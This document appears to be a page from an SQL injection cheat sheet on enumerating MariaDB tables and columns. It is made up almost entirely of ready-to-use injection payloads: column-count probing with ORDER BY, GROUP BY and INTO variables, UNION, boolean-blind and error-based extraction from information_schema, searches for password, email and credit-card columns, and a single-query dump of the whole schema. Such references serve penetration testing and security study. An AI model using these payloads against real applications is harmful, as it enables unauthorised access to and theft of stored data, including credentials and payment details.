---
title: Tables and Columns
description: How to discover and extract table and column information in MariaDB
category: Information Gathering
order: 9
tags: ["schema", "tables", "columns", "enumeration"]
lastUpdated: 2025-12-18
---

## Tables and Columns

Discovering table and column information is a critical step in SQL injection attacks. This information helps map the database structure for targeted data extraction.

### Determining Number of Columns

There are several methods to determine the number of columns in a query:

#### Using ORDER BY or GROUP BY

```sql
-- Keep incrementing n until you get an error
ORDER BY n
GROUP BY n

-- Can also order by multiple columns simultaneously
ORDER BY 1, 2
```

**Example:**

```sql
-- Assuming query: SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';
1' ORDER BY 1--+        -- True
1' ORDER BY 2--+        -- True
1' ORDER BY 3--+        -- True
1' ORDER BY 4--+        -- False (Error) - Query is only using 3 columns
-1' UNION SELECT 1,2,3--+ -- True (Success)

-- Multi-column ordering also works
1' ORDER BY 1, 2--+     -- True
```

#### Using GROUP BY with Error-based Method

```sql
-- Will show the column number in the error
1' GROUP BY 1,2,3,4,5--+
```

**Example:**

```sql
-- Assuming query with 3 columns
1' GROUP BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'group statement'"
1' ORDER BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'order clause'"
```

#### Using INTO Variables

```sql
-- Useful for finding columns after a LIMIT clause
-1 UNION SELECT 1 INTO @,@,@  -- Adjust number of @'s
```

**Example:**

```sql
-- Assuming query: SELECT permission FROM Users WHERE id = {INJECTION POINT};
-1 UNION SELECT 1 INTO @,@,@  -- Error: Different number of columns
-1 UNION SELECT 1 INTO @,@    -- Error: Different number of columns
-1 UNION SELECT 1 INTO @      -- No error means query uses 1 column
```

#### Using Subquery Comparison

```sql
-- Shows number of columns in the table (not query)
AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
```

**Example:**

```sql
1 AND (SELECT * FROM Users) = 1  -- Error: "Operand should contain 3 column(s)"
```

#### Using UNION SELECT

Test column count by adding/removing values until query succeeds:

```sql
-- Test with increasing columns until success
SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 2        -- Success (2 columns)
SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 2, 3    -- Fail (wrong count)

-- Using NULL for type compatibility
SELECT id, username FROM users WHERE id = 999 UNION SELECT NULL, NULL

-- Identify displayable columns with marker strings
SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 'MARKER_STRING'
-- Look for 'MARKER_STRING' in output to find which column is displayed
```

### Retrieving Tables

#### Using UNION

```sql
-- Filter by current database and table type
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_type='BASE TABLE';

-- Exclude system schemas
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');
```

**Note:** Use `TABLE_TYPE='BASE TABLE'` to filter for user-created tables (excludes views and system tables). Filter by `TABLE_SCHEMA` to exclude system databases.

#### Using Blind Injection

```sql
-- Basic character comparison (subquery must be wrapped in parentheses)
AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1) > 'A'
```

**Boolean-based extraction:**

```sql
-- Check first character of table name
SELECT IF(
  SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1), 1, 1) > 'A',
  1, 0
) AS result

-- Binary search for exact character (ASCII 117 = 'u' for 'users')
SELECT IF(
  ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema = database() AND table_name = 'users' LIMIT 1), 1, 1)) = 117,
  1, 0
) AS result

-- Check if specific table exists
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name = 'users') > 0,
  1, 0
) AS result
```

**In injection context:**

```sql
' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))=117 -- -
```

#### Using Error-based Techniques

```sql
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))

-- Alternative method
(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);

-- ExtractValue method
AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));

-- UpdateXML method
AND UpdateXML(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1)), 1);
```

The error message will contain the extracted table name.

### Retrieving Columns

#### Using UNION

```sql
-- Basic column enumeration
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

-- With table_schema filter (more precise)
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users'
```

**Get column names with data types:**

```sql
SELECT GROUP_CONCAT(CONCAT(column_name, ':', data_type)) AS columns
FROM information_schema.columns
WHERE table_schema = database() AND table_name = 'users'
-- Returns: id:int,username:varchar,password:varchar
```

**Get column ordinal position:**

```sql
SELECT column_name, ordinal_position
FROM information_schema.columns
WHERE table_schema = database() AND table_name = 'users'
ORDER BY ordinal_position
```

#### Using Blind Injection

```sql
-- Basic character comparison (subquery must be wrapped in parentheses)
AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_schema=database() LIMIT 1) > 'A'
```

**Boolean-based extraction:**

```sql
-- Check first character of column name
SELECT IF(
  SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users' LIMIT 1), 1, 1) > 'A',
  1, 0
) AS result

-- Check if specific column exists
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.columns
   WHERE table_schema = database() AND table_name = 'users' AND column_name = 'password') > 0,
  1, 0
) AS result

-- Count columns in a table
SELECT COUNT(*) FROM information_schema.columns
WHERE table_schema = database() AND table_name = 'users'
```

#### Using PROCEDURE ANALYSE() (Legacy)

_Note: This feature is deprecated and may not be available in newer MariaDB versions._

This technique can automatically extract column information when a query's output is displayed:

```sql
-- Appends column info to the query result
1 PROCEDURE ANALYSE()          -- First column
1 LIMIT 1,1 PROCEDURE ANALYSE() -- Second column
```

### Find Tables by Column Name

When looking for specific data like usernames or passwords:

```sql
-- Find tables containing a specific column
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';

-- Find tables with columns matching a pattern
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';

-- Find tables with 'id' column (common primary key)
SELECT DISTINCT table_name FROM information_schema.columns
WHERE column_name = 'id' AND table_schema = database();

-- Search for password-related columns
SELECT DISTINCT table_name FROM information_schema.columns
WHERE column_name LIKE '%pass%' AND table_schema = database();

-- Search for email-like columns
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%email%' AND table_schema = database();

-- Find tables with credit card or payment columns
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%card%' OR column_name LIKE '%credit%' OR column_name LIKE '%payment%';
```

### Current Query Inspection

You can view the currently executing query:

```sql
-- Via information_schema
SELECT info FROM information_schema.processlist WHERE info IS NOT NULL;

-- With connection details
SELECT id, user, host, db, command, info
FROM information_schema.processlist
WHERE info IS NOT NULL LIMIT 5;

-- Via performance_schema (if enabled)
SELECT info FROM performance_schema.processlist WHERE info IS NOT NULL;
```

This can reveal the full query structure including parts you cannot see in the application response.

**Note:** `performance_schema.processlist` may provide additional details depending on MariaDB configuration.

### Alternative information_schema Views

When `information_schema.tables` or `information_schema.columns` are blocked:

| Alternative View                       | Contains Table Names |
| -------------------------------------- | -------------------- |
| `information_schema.partitions`        | Yes                  |
| `information_schema.statistics`        | Yes                  |
| `information_schema.key_column_usage`  | Yes                  |
| `information_schema.table_constraints` | Yes                  |

### Retrieving Multiple Databases at Once

**Simple GROUP_CONCAT method:**

```sql
-- Get all tables and columns in current database
SELECT GROUP_CONCAT(CONCAT(table_name, '.', column_name)) AS data
FROM information_schema.columns
WHERE table_schema = database()

-- Get full structure with schema name
SELECT GROUP_CONCAT(
  CONCAT(table_schema, '.', table_name, '.', column_name)
  SEPARATOR '\n'
) AS full_structure
FROM information_schema.columns
WHERE table_schema = database()
```

**Advanced payload with user-defined variables:**

This retrieves all databases, tables, and columns in a single query:

```sql
SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ]>',table_name,' > ',column_name))))x
```

This technique uses a user-defined variable (`@`) to accumulate results across rows. The `0x0a` is a hex-encoded newline character that separates each entry.
